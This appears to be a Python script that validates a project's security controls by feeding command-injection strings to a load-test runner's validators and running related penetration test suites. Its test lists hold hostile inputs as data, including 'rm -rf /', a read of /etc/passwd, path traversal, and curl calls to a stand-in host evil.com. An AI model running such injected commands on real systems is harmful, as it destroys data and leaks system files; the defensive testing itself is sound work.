#!/usr/bin/env python3
"""Comprehensive Security Framework Validation Script.

This script validates all security enhancements implemented by Subagent 3I:
- Subprocess security in load testing infrastructure
- Enhanced penetration testing suite
- Input validation improvements
- Security test coverage validation

Run with: python tests/security/validate_security_framework.py
"""

# asyncio import removed (unused)
import json
import logging
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

# Add project root to path
from tests.load.run_load_tests import LoadTestRunner


project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class SecurityFrameworkValidator:
    """Comprehensive security framework validation."""

    def __init__(self):
        self.results = {
            "timestamp": time.time(),
            "validation_status": "RUNNING",
            "tests_passed": 0,
            "tests_failed": 0,
            "security_controls": {},
            "vulnerabilities_found": [],
            "recommendations": [],
        }

    def run_validation(self) -> dict[str, Any]:
        """Run comprehensive security validation."""
        logger.info("🔒 Starting Security Framework Validation")
        logger.info("=" * 60)

        try:
            # 1. Validate Subprocess Security
            self._validate_subprocess_security()

            # 2. Validate Penetration Testing Suite
            self._validate_penetration_tests()

            # 3. Validate Input Validation Enhancements
            self._validate_input_validation()

            # 4. Validate Load Testing Security Integration
            self._validate_load_testing_security()

            # 5. Generate final assessment
            self._generate_final_assessment()

        except (RuntimeError, subprocess.SubprocessError, ValueError) as e:
            logger.exception("Security validation failed: %s")
            self.results["validation_status"] = "FAILED"
            self.results["error"] = str(e)
        except Exception as e:
            logger.exception("Unexpected error during security validation: %s")
            self.results["validation_status"] = "FAILED"
            self.results["error"] = f"Unexpected error: {e}"

        return self.results

    def _validate_subprocess_security(self):
        """Validate subprocess security controls in load testing."""
        logger.info("🛡️  Validating Subprocess Security Controls")

        # Test 1: Command injection prevention
        try:
            runner = LoadTestRunner()

            # Test malicious input validation
            malicious_inputs = [
                "test; rm -rf /",
                "test`whoami`",
                "test$(cat /etc/passwd)",
                "test && curl evil.com",
            ]

            injection_blocked = 0
            for malicious_input in malicious_inputs:
                try:
                    runner._validate_test_type(malicious_input)
                    logger.warning(f"⚠️  Malicious input not blocked: {malicious_input}")
                except ValueError:
                    injection_blocked += 1

            self.results["security_controls"]["command_injection_prevention"] = {
                "status": "PASS"
                if injection_blocked == len(malicious_inputs)
                else "FAIL",
                "blocked_attempts": injection_blocked,
                "total_attempts": len(malicious_inputs),
            }

            if injection_blocked == len(malicious_inputs):
                logger.info("✅ Command injection prevention: PASS")
                self.results["tests_passed"] += 1
            else:
                logger.error("❌ Command injection prevention: FAIL")
                self.results["tests_failed"] += 1

        except Exception:
            logger.exception("Subprocess security validation failed: ")
            self.results["tests_failed"] += 1

    def _validate_penetration_tests(self):
        """Validate  penetration testing suite."""
        logger.info("🎯 Validating Penetration Testing Suite")

        # Test subprocess security test class
        result = self._run_pytest_command(
            [
                "tests/security/penetration/test_api_security.py::TestSubprocessSecurity",
                "-v",
                "--tb=short",
            ]
        )

        if result["return_code"] == 0:
            logger.info("✅ Subprocess security tests: PASS")
            self.results["tests_passed"] += 1
        else:
            logger.error("❌ Subprocess security tests: FAIL")
            self.results["tests_failed"] += 1

        self.results["security_controls"]["subprocess_security_tests"] = {
            "status": "PASS" if result["return_code"] == 0 else "FAIL",
            "output": result["stdout"][-500:]
            if result["stdout"]
            else "",  # Last 500 chars
        }

        # Test input validation enhancement tests
        result = self._run_pytest_command(
            [
                "tests/security/penetration/test_api_security.py::TestInputValidationEnhanced",
                "-v",
                "--tb=short",
            ]
        )

        if result["return_code"] == 0:
            logger.info("✅ Input validation tests: PASS")
            self.results["tests_passed"] += 1
        else:
            logger.error("❌ Input validation tests: FAIL")
            self.results["tests_failed"] += 1

        self.results["security_controls"]["input_validation_tests"] = {
            "status": "PASS" if result["return_code"] == 0 else "FAIL",
            "output": result["stdout"][-500:] if result["stdout"] else "",
        }

    def _validate_input_validation(self):
        """Validate input validation enhancements."""
        logger.info("🔍 Validating Input Validation Enhancements")

        try:
            runner = LoadTestRunner()

            # Test marker validation
            malicious_markers = [
                ["test; rm -rf /"],
                ["test`whoami`"],
                ["../../../etc/passwd"],
                ["$(curl evil.com)"],
            ]

            validation_passed = 0
            for markers in malicious_markers:
                try:
                    runner._validate_markers(markers)
                    logger.warning(f"⚠️  Malicious markers not blocked: {markers}")
                except ValueError:
                    validation_passed += 1

            self.results["security_controls"]["marker_validation"] = {
                "status": "PASS"
                if validation_passed == len(malicious_markers)
                else "FAIL",
                "blocked_attempts": validation_passed,
                "total_attempts": len(malicious_markers),
            }

            if validation_passed == len(malicious_markers):
                logger.info("✅ Marker validation: PASS")
                self.results["tests_passed"] += 1
            else:
                logger.error("❌ Marker validation: FAIL")
                self.results["tests_failed"] += 1

        except Exception:
            logger.exception("Input validation test failed: ")
            self.results["tests_failed"] += 1

    def _validate_load_testing_security(self):
        """Validate security integration with load testing."""
        logger.info("⚡ Validating Load Testing Security Integration")

        # Test secure pytest execution
        try:
            result = subprocess.run(
                [  # noqa: S607
                    "python",
                    str(project_root / "tests/load/run_load_tests.py"),
                    "--mode",
                    "pytest",
                    "--test-type",
                    "load",
                ],
                capture_output=True,
                text=True,
                timeout=60,
                cwd=project_root,
                check=False,
            )

            if result.returncode == 0:
                logger.info("✅ Load testing security integration: PASS")
                self.results["tests_passed"] += 1
            else:
                logger.warning(
                    f"⚠️  Load testing security integration: PARTIAL "
                    f"(code: {result.returncode})"
                )
                # Don't count as failure since tests might not exist yet

            self.results["security_controls"]["load_testing_integration"] = {
                "status": "PASS" if result.returncode == 0 else "PARTIAL",
                "return_code": result.returncode,
                "stderr": result.stderr[-300:] if result.stderr else "",
            }

        except subprocess.TimeoutExpired:
            logger.exception("❌ Load testing security integration: TIMEOUT")
            self.results["tests_failed"] += 1
        except Exception:
            logger.exception("Load testing security validation failed: ")
            self.results["tests_failed"] += 1

    def _run_pytest_command(self, args: list[str]) -> dict[str, Any]:
        """Run pytest command and return results."""
        try:
            cmd = ["uv", "run", "pytest", *args]
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
                cwd=project_root,
                check=False,
            )

            return {
                "return_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": " ".join(cmd),
            }

        except subprocess.TimeoutExpired:
            return {
                "return_code": -1,
                "stdout": "",
                "stderr": "Test execution timed out",
                "command": " ".join(cmd),
            }
        except (subprocess.SubprocessError, OSError, TimeoutError) as e:
            return {
                "return_code": -2,
                "stdout": "",
                "stderr": str(e),
                "command": " ".join(cmd),
            }

    def _generate_final_assessment(self):
        """Generate final security assessment."""
        logger.info("📊 Generating Security Assessment")

        total_tests = self.results["tests_passed"] + self.results["tests_failed"]
        success_rate = (self.results["tests_passed"] / max(total_tests, 1)) * 100

        # Determine overall status
        if success_rate >= 90:
            status = "EXCELLENT"
            grade = "A"
        elif success_rate >= 80:
            status = "GOOD"
            grade = "B"
        elif success_rate >= 70:
            status = "ACCEPTABLE"
            grade = "C"
        elif success_rate >= 60:
            status = "POOR"
            grade = "D"
        else:
            status = "CRITICAL"
            grade = "F"

        self.results["validation_status"] = status
        self.results["security_grade"] = grade
        self.results["success_rate"] = success_rate

        # Generate recommendations
        if success_rate < 100:
            self.results["recommendations"].extend(
                [
                    "Review failed security tests and address vulnerabilities",
                    "Implement additional security controls for failed test cases",
                    "Enhance monitoring and alerting for security events",
                ]
            )

        # Security controls summary
        controls_passed = sum(
            1
            for control in self.results["security_controls"].values()
            if control.get("status") == "PASS"
        )
        total_controls = len(self.results["security_controls"])

        logger.info("=" * 60)
        logger.info("🔒 SECURITY FRAMEWORK VALIDATION SUMMARY")
        logger.info("=" * 60)
        logger.info(f"Overall Status: {status} (Grade: {grade})")
        logger.info(f"Success Rate: {success_rate:.1f}%")
        logger.info(f"Tests Passed: {self.results['tests_passed']}")
        logger.info(f"Tests Failed: {self.results['tests_failed']}")
        logger.info(f"Security Controls: {controls_passed}/{total_controls} PASS")
        logger.info("=" * 60)

        # Log security controls status
        for control_name, control_data in self.results["security_controls"].items():
            status_emoji = (
                "✅"
                if control_data["status"] == "PASS"
                else "❌"
                if control_data["status"] == "FAIL"
                else "⚠️"
            )
            logger.info(f"{status_emoji} {control_name}: {control_data['status']}")

    def save_report(self, filepath: str | None = None):
        """Save validation report to file."""
        if not filepath:
            timestamp = int(time.time())
            filepath = f"security_validation_report_{timestamp}.json"

        filepath = Path(filepath)
        with filepath.open("w") as f:
            json.dump(self.results, f, indent=2)

        logger.info(f"📄 Security validation report saved: {filepath}")
        return str(filepath)


def main():
    """Main entry point for security validation."""
    validator = SecurityFrameworkValidator()

    try:
        # Run validation
        results = validator.run_validation()

        # Save report
        # report_file = validator.save_report()

        # Exit with appropriate code
        if results["validation_status"] in ["EXCELLENT", "GOOD", "ACCEPTABLE"]:
            logger.info("✅ Security framework validation completed successfully")
            sys.exit(0)
        else:
            logger.error("❌ Security framework validation failed")
            sys.exit(1)

    except KeyboardInterrupt:
        logger.info("Security validation interrupted by user")
        sys.exit(1)
    except Exception:
        logger.exception("Security validation failed: ")
        sys.exit(1)


if __name__ == "__main__":
    main()
